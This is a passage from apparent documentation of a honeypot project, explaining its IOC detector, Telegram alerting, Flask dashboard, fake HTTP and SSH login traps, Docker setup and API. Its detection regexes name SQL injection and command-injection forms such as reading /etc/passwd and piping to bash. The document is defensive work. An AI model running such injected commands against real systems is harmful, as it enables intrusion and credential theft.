        message = log_entry
    else:
        message = log_entry.get('message', '')
    
    detected = []
    
    # Check against all attack patterns
    for ioc_type, patterns in IOC_PATTERNS.items():
        for pattern in patterns:
            # Use regex to search for pattern
            if re.search(pattern, message, re.IGNORECASE):
                detected.append({
                    'type': ioc_type,
                    'pattern': pattern,
                    'message': message[:200],  # Truncate long messages
                    'timestamp': datetime.now().isoformat()
                })
                logger.warning(f"Detected IOC: {ioc_type} - {pattern}")
    
    return detected
```

**Step 3: Alert Sending (alert_manager.py)**
```python
# Line ~167 in alert_manager.py
class TelegramBot:
    def send_message(self, message: str, parse_mode: str = 'HTML') -> bool:
        """
        Sends message to Telegram with retry logic
        """
        # Build API URL with bot token
        url = f"{self.base_url}/sendMessage"
        
        # Prepare payload
        payload = {
            'chat_id': self.chat_id,      # Who to send to
            'text': message,               # What to send
            'parse_mode': parse_mode,      # HTML formatting
            'disable_web_page_preview': True  # No link previews
        }
        
        # Try up to 3 times
        for attempt in range(self.max_retries):
            try:
                response = requests.post(url, json=payload, timeout=10)
                
                if response.status_code == 200:
                    logger.info("Telegram alert sent successfully")
                    return True
                    
                elif response.status_code == 429:
                    # Rate limited - wait and retry
                    retry_after = response.json().get('parameters', {}).get('retry_after', 30)
                    time.sleep(retry_after)
                    
            except requests.exceptions.Timeout:
                logger.warning(f"Timeout (attempt {attempt + 1})")
                time.sleep(self.retry_delay * (attempt + 1))
                
            except Exception as e:
                logger.error(f"Request failed: {e}")
                return False
        
        return False
```

---

## 7. Log Analysis

### 7.1 How Logs Are Analyzed

**The Process:**
```
Raw Logs ──▶ Parse ──▶ Filter ──▶ Analyze ──▶ Alert/Report
```

**1. Parse:**
```python
# Read log file line by line
with open('honeypot.log', 'r') as f:
    for line in f:
        # Parse JSON log entry
        log_entry = json.loads(line)
        process_entry(log_entry)
```

**2. Filter:**
```python
# Only process certain types
def should_process(entry):
    # Skip if too old
    if entry['timestamp'] < cutoff_time:
        return False
    
    # Only process attacks
    if not entry.get('attack_detected'):
        return False
    
    return True
```

**3. Analyze:**
```python
# Count attacks by type
attack_counts = {}
for entry in logs:
    attack_type = entry['attack_detected']['type']
    attack_counts[attack_type] = attack_counts.get(attack_type, 0) + 1

# Result: {'sql_injection': 45, 'xss': 23, 'brute_force': 156}
```

### 7.2 Detect Repeated Attackers

```python
def find_repeat_offenders(logs, threshold=10):
    """
    Find IPs that attack multiple times
    """
    ip_counts = {}
    
    for entry in logs:
        ip = entry['source_ip']
        ip_counts[ip] = ip_counts.get(ip, 0) + 1
    
    # Filter for repeat offenders
    repeat_offenders = {
        ip: count for ip, count in ip_counts.items()
        if count >= threshold
    }
    
    return repeat_offenders

# Example output:
# {'192.168.1.100': 45, '10.0.0.50': 23}
```

### 7.3 Rate Limiting

```python
from collections import defaultdict
from datetime import datetime, timedelta

class RateLimiter:
    def __init__(self, max_requests=10, window=60):
        self.max_requests = max_requests  # Max requests allowed
        self.window = window              # Time window in seconds
        self.requests = defaultdict(list)  # Store requests per IP
    
    def is_allowed(self, ip):
        """
        Check if request from IP should be allowed
        """
        now = datetime.now()
        
        # Clean old requests outside window
        self.requests[ip] = [
            req_time for req_time in self.requests[ip]
            if now - req_time < timedelta(seconds=self.window)
        ]
        
        # Check if under limit
        if len(self.requests[ip]) >= self.max_requests:
            return False  # Rate limit exceeded
        
        # Record this request
        self.requests[ip].append(now)
        return True
```

### 7.4 Pattern Detection

```python
def detect_attack_patterns(logs):
    """
    Find common attack patterns
    """
    patterns = {
        'time_based': detect_time_patterns(logs),
        'geographic': detect_geo_patterns(logs),
        'target_based': detect_target_patterns(logs)
    }
    return patterns

def detect_time_patterns(logs):
    """
    Find if attacks happen at specific times
    """
    hourly_distribution = [0] * 24
    
    for entry in logs:
        hour = datetime.fromisoformat(entry['timestamp']).hour
        hourly_distribution[hour] += 1
    
    return hourly_distribution

# Result: [2, 1, 0, 0, 1, 3, 5, 8, 12, 15, ...]
# Shows attacks peak at 9 AM (index 9)
```

### 7.5 Basic Anomaly Detection

```python
import statistics

def detect_anomalies(logs, threshold=2):
    """
    Detect unusual activity using standard deviation
    """
    # Count attacks per hour
    hourly_counts = count_attacks_per_hour(logs)
    
    # Calculate statistics
    mean = statistics.mean(hourly_counts)
    std_dev = statistics.stdev(hourly_counts)
    
    # Find anomalies (values far from mean)
    anomalies = []
    for hour, count in enumerate(hourly_counts):
        if abs(count - mean) > threshold * std_dev:
            anomalies.append({
                'hour': hour,
                'count': count,
                'expected': mean,
                'deviation': (count - mean) / std_dev
            })
    
    return anomalies

# Example output:
# [{'hour': 14, 'count': 150, 'expected': 25, 'deviation': 5.2}]
# Hour 14 had 150 attacks when normally 25 (5.2 standard deviations above normal!)
```

---

## 8. Full Code Explanation

### 8.1 File: `alert_manager.py`

**Purpose:** Centralized alerting system for Telegram, Slack, and webhooks.

#### Line-by-Line Explanation:

```python
#!/usr/bin/env python3
"""
Alert Manager - Centralized alerting system with retry logic
Handles Telegram, Slack, and Webhook alerts with proper error handling
"""
```
**Lines 1-6:**
- Shebang (`#!/usr/bin/env python3`) - Tells system to use Python 3
- Module docstring - Explains what this file does

```python
import os
import json
import logging
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum
```
**Lines 8-16:**
- `os` - Access environment variables
- `json` - Work with JSON data
- `logging` - Log events
- `time` - Add delays for retries
- `requests` - Make HTTP calls to APIs
- `datetime` - Work with timestamps
- `typing` - Type hints for better code clarity
- `dataclasses` - Simplify class creation
- `enum` - Create enumerated constants

```python
# Configure logging
logger = logging.getLogger(__name__)
```
**Line 18:**
- Get logger instance for this module
- `__name__` is the module name (alert_manager)

```python
class AlertChannel(Enum):
    TELEGRAM = "telegram"
    SLACK = "slack"
    WEBHOOK = "webhook"
```
**Lines 20-23:**
- Define an enumeration for alert channels
- `Enum` ensures only these three values are valid
- Prevents typos when specifying channels

```python
@dataclass
class AlertMessage:
    """Structured alert message"""
    title: str
    message: str
    severity: str
    source: str
    timestamp: datetime
    metadata: Optional[Dict] = None
```
**Lines 25-33:**
- `@dataclass` automatically creates `__init__`, `__repr__`, etc.
- Defines structure of an alert message
- `Optional[Dict]` means metadata can be None or a dictionary

```python
    def to_telegram_html(self) -> str:
        """Convert to Telegram HTML format"""
        emoji_map = {
            'low': 'ℹ️',
            'medium': '⚠️',
            'high': '🚨',
            'critical': '🔴'
        }
        emoji = emoji_map.get(self.severity, 'ℹ️')
```
**Lines 35-45:**
- Method to format alert for Telegram
- Maps severity levels to emojis
- `get()` with default ensures no KeyError

```python
        html = f"""
<b>{emoji} {self.title}</b>

<b>Severity:</b> {self.severity.upper()}
<b>Source:</b> {self.source}
<b>Time:</b> {self.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}

<pre>{self.message}</pre>
"""
```
**Lines 47-56:**
- Creates HTML-formatted message
- `<b>` = bold in Telegram HTML
- `<pre>` = monospace code block
- `strftime()` formats datetime as string

```python
class TelegramBot:
    """Telegram Bot with retry logic and error handling"""
    
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.max_retries = 3
        self.retry_delay = 2
```
**Lines 65-75:**
- Class to handle Telegram API
- `__init__` runs when object created
- `base_url` is Telegram API endpoint
- Sets retry parameters

```python
        # Validate configuration
        if not bot_token or not chat_id:
            logger.warning("Telegram bot not fully configured")
            self.enabled = False
        else:
            self.enabled = True
            logger.info("Telegram bot initialized")
```
**Lines 77-83:**
- Validates that credentials are provided
- Sets `enabled` flag
- Logs status for debugging

```python
    def send_message(self, message: str, parse_mode: str = 'HTML') -> bool:
        """Send message with retry logic"""
        if not self.enabled:
            logger.debug("Telegram bot disabled - skipping")
            return False
```
**Lines 85-90:**
- Main method to send messages
- Returns bool indicating success/failure
- Early return if not enabled

```python
        url = f"{self.base_url}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': message,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True
        }
```
**Lines 92-100:**
- Constructs API URL
- Builds payload dictionary
- `disable_web_page_preview` prevents link previews

```python
        for attempt in range(self.max_retries):
            try:
                response = requests.post(url, json=payload, timeout=10)
                
                if response.status_code == 200:
                    logger.info("Telegram alert sent")
                    return True
```
**Lines 102-111:**
- Retry loop (up to 3 times)
- `try` catches any errors
- POST request to Telegram API
- 200 status code = success

```python
                elif response.status_code == 429:
                    retry_after = response.json().get('parameters', {}).get('retry_after', 30)
                    logger.warning(f"Rate limited. Retrying after {retry_after}s")
                    time.sleep(retry_after)
```
**Lines 113-117:**
- 429 = Too Many Requests (rate limited)
- Telegram tells us how long to wait
- Sleep for that duration before retry

```python
            except requests.exceptions.Timeout:
                logger.warning(f"Timeout (attempt {attempt + 1})")
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay * (attempt + 1))
```
**Lines 119-124:**
- Handles network timeout
- Exponential backoff: wait longer each retry
- Only sleep if we have retries left

```python
        logger.error("Failed to send after all retries")
        return False
```
**Lines 126-127:**
- All retries exhausted
- Log error and return failure

### 8.2 File: `ioc_detector.py`

**Purpose:** Detects Indicators of Compromise (IOCs) in log files.

#### Key Sections:

```python
IOC_PATTERNS = {
    'sql_injection': [
        r"union.*select",      # UNION SELECT attack
        r"';.*--",             # Comment injection
        r"or.*1=1",           # Always true condition
        r"drop.*table",       # Table deletion
        r"exec.*xp_",         # Extended stored procedures
    ],
    'command_injection': [
        r";.*cat.*\/etc\/passwd",  # Read password file
        r"\|.*bash",                # Pipe to bash
        r"`.*whoami",               # Command substitution
    ],
    # ... more patterns
}
```
**Explanation:**
- Dictionary mapping attack types to regex patterns
- `r"..."` = raw string (treats backslashes literally)
- `.*` = match any characters
- Patterns detect common attack signatures

```python
class IOCDetector:
    def detect(self, log_entry):
        """Detect IOCs in a log entry"""
        message = log_entry.get('message', '')
        detected = []
        
        for ioc_type, patterns in IOC_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, message, re.IGNORECASE):
                    detected.append({
                        'type': ioc_type,
                        'pattern': pattern,
                        'message': message[:200],
                        'timestamp': datetime.now().isoformat()
                    })
        
        return detected
```
**Explanation:**
- Takes a log entry
- Extracts the message content
- Checks against all IOC patterns
- Returns list of detected threats
- `re.IGNORECASE` = case-insensitive matching

```python
class LogFileHandler(FileSystemEventHandler):
    def on_modified(self, event):
        """Called when a log file is modified"""
        if event.is_directory:
            return
        if event.src_path.endswith('.log'):
            self.process_log_file(event.src_path)
```
**Explanation:**
- Extends watchdog's event handler
- `on_modified` called when file changes
- Ignores directories
- Only processes `.log` files

```python
    def process_log_file(self, filepath):
        with open(filepath, 'r') as f:
            lines = f.readlines()
        
        for line in lines:
            line_hash = hash(line.strip())
            if line_hash in self.processed_lines:
                continue
            self.processed_lines.add(line_hash)
            
            detected = self.detector.detect(line)
            if detected:
                for ioc in detected:
                    self.detector.save_ioc(ioc)
                    self.alert_sender.send_alert(...)
```
**Explanation:**
- Reads entire log file
- Uses hash to avoid processing duplicate lines
- Detects IOCs in each line
- Saves and alerts on detection

### 8.3 File: `web_dashboard.py`

**Purpose:** Flask web server providing dashboard UI and API.

#### Key Sections:

```python
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-key')
socketio = SocketIO(app, cors_allowed_origins="*")
```
**Explanation:**
- Creates Flask application
- Sets secret key for sessions
- Initializes SocketIO for real-time features
- `cors_allowed_origins="*"` allows all origins (development only!)

```python
@app.route('/')
@login_required
def dashboard():
    """Main dashboard page"""
    return render_template('dashboard.html')
```
**Explanation:**
- `@app.route('/')` = handle requests to root URL
- `@login_required` = must be logged in
- `render_template()` = renders HTML template

```python
@app.route('/api/sessions')
@login_required
def api_sessions():
    """API endpoint for session data"""
    sessions = []
    sessions_dir = Path('/sessions')
    
    for session_file in sessions_dir.glob('*.json'):
        with open(session_file) as f:
            session = json.load(f)
            sessions.append(session)
    
    return jsonify(sessions)
```
**Explanation:**
- API endpoint returns JSON data
- Reads all session files from directory
- `jsonify()` converts Python dict to JSON response
- Used by frontend to display data

```pythonn@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    logger.info(f'Client connected: {request.sid}')
    emit('connected', {'data': 'Connected to server'})
```
**Explanation:**
- Runs when browser connects via WebSocket
- `request.sid` = unique session ID
- `emit()` sends message back to client

### 8.4 File: `http_honeypot.py`

**Purpose:** Fake HTTP server that looks like a real corporate portal.

#### Key Sections:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Log the attempt
        logger.warning(f"Login attempt: {username}/{password}")
        
        # Always reject but make it look real
        return render_template('login.html', error="Invalid credentials")
    
    return render_template('login.html')
```
**Explanation:**
- Handles GET (show form) and POST (process login)
- Captures username and password
- Logs for analysis
- Always shows error (honeypot behavior)

```python
# HTML template with CSS animations
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <style>
        /* Animated background */
        @keyframes orbFloat {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(30px, -30px); }
        }
        .orb {
            animation: orbFloat 20s ease-in-out infinite;
        }
    </style>
</head>
<body>
    <!-- Glassmorphism login card -->
    <div class="login-container">
        <form method="POST">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""
```
**Explanation:**
- HTML embedded in Python string
- CSS animations make it look professional
- Glassmorphism = frosted glass effect
- Form posts to same URL

### 8.5 File: `ssh_honeypot.py`

**Purpose:** Emulates SSH server to capture login attempts.

#### Key Sections:

```python
import paramiko

class HoneypotSSHServer(paramiko.ServerInterface):
    """SSH server that accepts all auth but logs everything"""
    
    def check_auth_password(self, username, password):
        """Called when user tries password auth"""
        self.session.log_login_attempt(username, password)
        return paramiko.AUTH_SUCCESSFUL
    
    def check_auth_publickey(self, username, key):
        """Called when user tries key auth"""
        logger.info(f"Key auth attempt for {username}")
        return paramiko.AUTH_SUCCESSFUL
```
**Explanation:**
- Extends Paramiko's SSH server interface
- `check_auth_password` = password authentication
- `check_auth_publickey` = key authentication
- Always returns SUCCESS (honeypot behavior)
- Logs everything for analysis

```python
def start_server():
    """Start SSH honeypot server"""
    # Generate or load host key
    host_key = paramiko.RSAKey.generate(2048)
    
    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 2222))
    sock.listen(100)
    
    while True:
        client, addr = sock.accept()
        # Handle connection in new thread
        threading.Thread(target=handle_client, args=(client, addr)).start()
```
**Explanation:**
- Generates RSA key for SSH
- Creates TCP socket on port 2222
- `SO_REUSEADDR` allows quick restart
- `listen(100)` = queue up to 100 connections
- Each connection handled in separate thread

### 8.6 File: `dashboard.html`

**Purpose:** Frontend dashboard with interactive world map.

#### Key Sections:

```html
<!-- Leaflet.js for maps -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://unpkg.com/leaflet.heat@0.2.0/dist/leaflet-heat.js"></script>
```
**Explanation:**
- Leaflet CSS for map styling
- Leaflet JS for map functionality
- Leaflet.heat plugin for heatmap overlay
- Loaded from CDN (Content Delivery Network)

```javascript
// Initialize threat map
let threatMap = null;
let heatmapLayer = null;

function initThreatMap() {
    // Create map centered on world view
    threatMap = L.map('worldMap', {
        center: [20, 0],      // Latitude, Longitude
        zoom: 2,               // Zoom level (1 = world, 10 = city)
        minZoom: 2,           // Prevent zooming out too far
        maxZoom: 8            // Prevent zooming in too close
    });
    
    // Add dark-themed map tiles
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        attribution: '© OpenStreetMap, © CARTO'
    }).addTo(threatMap);
}
```
**Explanation:**
- `L.map()` creates map in HTML element with id 'worldMap'
- Center at [20, 0] shows most of world
- `minZoom/maxZoom` limit zoom levels
- `L.tileLayer()` adds map images (tiles)
- CARTO dark theme matches our dashboard

```javascript
// Add heatmap for attack visualization
function updateHeatmap(attackData) {
    // Convert attack data to [lat, lng, intensity] format
    const heatPoints = attackData.map(attack => [
        attack.latitude,
        attack.longitude,
        attack.intensity  // 0.0 to 1.0
    ]);
    
    // Create or update heatmap layer
    if (heatmapLayer) {
        threatMap.removeLayer(heatmapLayer);
    }
    
    heatmapLayer = L.heatLayer(heatPoints, {
        radius: 25,      // Size of each point
        blur: 15,        // Blur amount
        maxZoom: 10,     // Max zoom for heatmap
        gradient: {      // Color gradient
            0.4: 'blue',
            0.6: 'cyan',
            0.8: 'yellow',
            1.0: 'red'
        }
    }).addTo(threatMap);
}
```
**Explanation:**
- `L.heatLayer()` creates heatmap from points
- Each point has location and intensity
- Gradient shows low (blue) to high (red) activity
- Removing old layer prevents duplicates

```javascript
// Real-time updates via Socket.IO
const socket = io();

socket.on('new_session', function(data) {
    console.log('New attack detected:', data);
    
    // Add marker to map
    const marker = L.marker([data.lat, data.lng])
        .addTo(threatMap)
        .bindPopup(`
            <b>Attack from ${data.country}</b><br>
            IP: ${data.ip}<br>
            Type: ${data.attack_type}<br>
            Time: ${data.timestamp}
        `);
    
    // Update statistics
    updateStats(data);
    
    // Add to recent attacks list
    addToAttackList(data);
});
```
**Explanation:**
- `io()` connects to Socket.IO server
- `socket.on()` listens for events
- Creates marker with popup on map
- Updates multiple UI components
- All happens in real-time!

---

## 9. Docker & Deployment

### 9.1 What is Docker?

**Analogy:** Shipping containers

Imagine shipping a cake:
- **Without Docker:** Send recipe, hope they have ingredients, oven, etc.
- **With Docker:** Send entire kitchen with cake already made

Docker packages your application with:
- Code
- Runtime (Python, Node.js)
- Libraries
- System tools
- Configuration

### 9.2 Dockerfile Explained

```dockerfile
# monitoring/web-dashboard/Dockerfile

# Use official Python image as base
FROM python:3.9-slim
```
**Explanation:**
- `FROM` = starting point
- `python:3.9-slim` = Python 3.9, minimal size
- Like choosing a base recipe

```dockerfile
# Set working directory inside container
WORKDIR /app
```
**Explanation:**
- All subsequent commands run here
- Equivalent to `cd /app`

```dockerfile
# Copy requirements first (for caching)
COPY requirements.txt .
```
**Explanation:**
- Copy only requirements first
- Docker caches this layer
- If requirements don't change, skip reinstall

```dockerfile
# Install Python dependencies
RUN pip install --no-cache-dir -r requirements.txt
```
**Explanation:**
- `RUN` executes command
- `--no-cache-dir` = don't save pip cache (smaller image)
- Installs Flask, SocketIO, etc.

```dockerfile
# Copy application code
COPY . .
```
**Explanation:**
- Copy everything from current directory
- Now includes all Python files

```dockerfile
# Expose port 5000
EXPOSE 5000
```
**Explanation:**
- Documents which port app uses
- Doesn't actually open port (done in docker-compose)

```dockerfile
# Command to run when container starts
CMD ["python", "web_dashboard.py"]
```
**Explanation:**
- `CMD` = default command
- Runs when container starts
- Can be overridden

### 9.3 Docker Compose Explained

```yaml
# docker-compose.yml

version: '3.8'  # Docker Compose file format version

services:
  # Define each service (container)
```
**Explanation:**
- YAML format (like JSON but easier to read)
- `version` = which Compose features available
- `services` = list of containers

```yaml
  web-dashboard:
    build:
      context: ./monitoring/web-dashboard
      dockerfile: Dockerfile
    container_name: web-dashboard
```
**Explanation:**
- `web-dashboard` = service name
- `build` = how to build image
- `context` = where to find files
- `container_name` = name for container

```yaml
    networks:
      - honeypot-network
    ports:
      - "5000:5000"
```
**Explanation:**
- `networks` = which network to join
- `ports` = map host port to container port
- `"5000:5000"` = host:container

```yaml
    volumes:
      - ./data/logs:/logs:ro
      - ./data/sessions:/sessions:ro
```
**Explanation:**
- `volumes` = mount host directories
- `./data/logs` = host path
- `/logs` = container path
- `:ro` = read-only (security!)

```yaml
    environment:
      - DASHBOARD_PORT=5000
    restart: unless-stopped
    depends_on:
      - log-aggregator
```
**Explanation:**
- `environment` = set env variables
- `restart` = auto-restart policy
- `depends_on` = start order (not wait!)

```yaml
networks:
  honeypot-network:
    driver: bridge
    internal: false
```
**Explanation:**
- `driver: bridge` = isolated network
- `internal: false` = allows external access
- Set to `true` for complete isolation

### 9.4 Deployment Commands

```bash
# Build and start all services
docker-compose up -d
```
**Explanation:**
- `up` = create and start containers
- `-d` = detached mode (background)
- Builds images if needed

```bash
# View logs
docker-compose logs -f
```
**Explanation:**
- `logs` = show container output
- `-f` = follow (like tail -f)
- Press Ctrl+C to stop following

```bash
# Stop all services
docker-compose down
```
**Explanation:**
- Stops and removes containers
- Keeps volumes (data persists)
- Add `-v` to remove volumes too

```bash
# Restart single service
docker-compose restart web-dashboard
```
**Explanation:**
- Restarts specific container
- Useful after code changes

```bash
# View running containers
docker-compose ps
```
**Explanation:**
- Shows status of all services
- Check if healthy

---

## 10. API Reference

### 10.1 REST API Endpoints

#### GET /api/sessions
Returns list of all attack sessions.

**Request:**
```http
GET /api/sessions HTTP/1.1
Authorization: Bearer <token>
```

**Response:**
```json
[
  {
    "session_id": "sess_abc123",
    "source_ip": "192.168.1.100",
    "country": "US",
    "attack_type": "brute_force",
    "start_time": "2024-01-15T10:00:00Z",
    "end_time": "2024-01-15T10:05:00Z",
    "request_count": 50
  }
]
```

#### GET /api/session/<id>
Returns details for specific session.

**Request:**
```http
GET /api/session/sess_abc123 HTTP/1.1
```

**Response:**
```json
{
  "session_id": "sess_abc123",
  "source_ip": "192.168.1.100",
  "requests": [
    {
      "timestamp": "2024-01-15T10:00:00Z",
      "method": "POST",
      "path": "/login",
      "body": "username=admin&password=123456"
    }
  ]
}
```

#### GET /api/stats
Returns aggregate statistics.

**Response:**
```json
{
  "total_sessions": 150,
  "total_attacks": 523,
  "unique_ips": 45,
  "top_countries": ["CN", "RU", "US"],
  "attack_types": {
    "brute_force": 200,
    "sql_injection": 50,
    "xss": 30
  }
}
```

#### GET /api/country/<country_code>
Returns threat data for specific country.

**Request:**
```http
GET /api/country/US?timeRange=24h&attackType=all HTTP/1.1
```

**Parameters:**
- `timeRange`: 1h, 24h, 7d, 30d
- `attackType`: all, brute_force, sql_injection, etc.

**Response:**
```jsonn{
  "country": "US",
  "countryName": "United States",
  "totalAttacks": 45,
  "uniqueIPs": 12,
  "threatLevel": "medium",
  "attackTypes": {
    "brute_force": 30,
    "sql_injection": 15
  }
}
```

### 10.2 WebSocket Events

#### Client → Server

**connect**
```javascript
socket.connect();
```
Called automatically when page loads.

**subscribe**
```javascript
socket.emit('subscribe', { channel: 'attacks' });
```
Subscribe to specific update channels.

#### Server → Client

**new_session**
```javascript
socket.on('new_session', (data) => {
  console.log('New attack:', data);
});
```
Emitted when new attack session starts.

**session_update**
```javascript
socket.on('session_update', (data) => {
  console.log('Session updated:', data);
});
```
Emitted when existing session gets new data.

**stats_update**
```javascript
socket.on('stats_update', (data) => {
  updateDashboardStats(data);
});
```
Emitted periodically with new statistics.

### 10.3 Error Responses

All errors follow this format:

```json
{
  "error": true,
  "code": "INVALID_COUNTRY_CODE",
  "message": "Country code must be 2 characters",
  "timestamp": "2024-01-15T10:30:00Z"
}
```

**Common Error Codes:**

| Code | HTTP Status | Meaning |
|------|-------------|---------|
| UNAUTHORIZED | 401 | Not logged in |
| NOT_FOUND | 404 | Resource doesn't exist |
| INVALID_PARAMETER | 400 | Bad request parameter |
| RATE_LIMITED | 429 | Too many requests |
| SERVER_ERROR | 500 | Internal server error |

---

## 11. Security Best Practices

### 11.1 Honeypot Deployment

**Network Isolation:**
```yaml
# docker-compose.yml
networks:
  honeypot-network:
    internal: true  # No external access
```

**Why:** Prevents attackers from using honeypot as pivot point.

**Resource Limits:**
```yaml
services:
  http-honeypot:
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
```

**Why:** Prevents DoS attacks from consuming all resources.

### 11.2 Log Protection

**Encryption at Rest:**
```bash
# Encrypt log files
gpg --encrypt --recipient security@company.com logs.tar.gz
```

**Access Controls:**
```bash
# Restrict log access
chmod 600 /var/log/honeypot/*.log
chown root:security /var/log/honeypot/
```

### 11.3 Alert Security

**Token Rotation:**
```python
# Rotate Telegram bot token monthly
# @BotFather → /revoke → /token
```

**Webhook Verification:**
```python
# Verify webhook signatures
import hmac
import hashlib

def verify_webhook(payload, signature, secret):
    expected = hmac.new(
        secret.encode(),
        payload.encode(),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(expected, signature)
```

---

## 12. Troubleshooting Guide

### 12.1 Common Issues

**Issue: Dashboard not loading**
```
Symptom: Connection refused on port 5000
Solution:
1. Check if container is running: docker-compose ps
2. Check logs: docker-compose logs web-dashboard
3. Verify port mapping in docker-compose.yml
4. Check firewall rules
```

**Issue: Telegram alerts not working**
```
Symptom: No messages received
Solution:
1. Verify TELEGRAM_BOT_TOKEN in .env
2. Verify TELEGRAM_CHAT_ID
3. Message bot first to start conversation
4. Check ioc-detector logs: docker-compose logs ioc-detector
5. Test manually: python monitoring/ioc-detector/alert_manager.py
```

**Issue: Map not displaying**
```
Symptom: Empty map area
Solution:
1. Check browser console for JavaScript errors
2. Verify internet connection (Leaflet loads from CDN)
3. Check if Leaflet CSS/JS loaded in Network tab
4. Verify map container has height in CSS
```

**Issue: High memory usage**
```
Symptom: System running slow
Solution:
1. Check container memory: docker stats
2. Add log rotation
3. Limit session retention
4. Increase swap space
```

### 12.2 Debug Mode

Enable debug logging:
```python
# In any Python file
import logging
logging.basicConfig(level=logging.DEBUG)
```

Check specific service:
```bash
# Follow logs in real-time
docker-compose logs -f <service_name>

# Example:
docker-compose logs -f ioc-detector
```

---

## 13. Glossary

| Term | Definition |
|------|------------|
| **Honeypot** | Decoy system designed to attract attackers |
| **IOC** | Indicator of Compromise - evidence of intrusion |
| **Payload** | Actual data/content of an attack |
| **Brute Force** | Trying many passwords until one works |
| **SQL Injection** | Inserting malicious SQL into queries |
| **XSS** | Cross-Site Scripting - injecting client-side scripts |
| **Regex** | Regular Expression - pattern matching syntax |
| **API** | Application Programming Interface |
| **Container** | Lightweight isolated environment |
| **WebSocket** | Persistent connection for real-time data |
| **Heatmap** | Visual representation of data density |
| **Rate Limiting** | Restricting request frequency |
| **TLS/SSL** | Encryption for network connections |
| **Webhook** | HTTP callback for event notifications |

---

## 14. Further Reading

### Books
- "The Honeynet Project: Tracking Hackers" - Lance Spitzner
- "Hacking Exposed" - Stuart McClure
- "The Web Application Hacker's Handbook" - Dafydd Stuttard

### Online Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Telegram Bot API Docs](https://core.telegram.org/bots/api)
- [Leaflet.js Documentation](https://leafletjs.com/reference.html)
- [Flask Documentation](https://flask.palletsprojects.com/)

### Communities
- r/honeypots (Reddit)
- r/cybersecurity (Reddit)
- OWASP Slack Channel
- SANS Internet Storm Center

---

<p align="center">
  <strong>End of Documentation</strong><br>
  For questions or issues, refer to README.md or open a GitHub issue.
</p>